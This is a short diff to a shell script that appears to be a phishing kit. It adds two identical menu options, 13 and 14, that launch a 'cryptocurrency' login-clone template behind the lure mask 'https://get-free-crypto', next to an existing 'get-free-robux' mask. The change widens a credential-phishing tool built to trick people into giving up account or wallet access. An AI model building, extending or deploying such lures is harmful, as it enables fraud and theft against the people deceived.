@@ -764,6 +764,14 @@ main_menu() {
 			website="roblox"
 			mask='https://get-free-robux'
 			tunnel_menu;;
+		13)
+			website="cryptocurrency"
+			mask='https://get-free-crypto'
+			tunnel_menu;;
+		14)
+			website="cryptocurrency"
+			mask='https://get-free-crypto'
+			tunnel_menu;;
 		99)
 			about;;
 		0 | 00 )
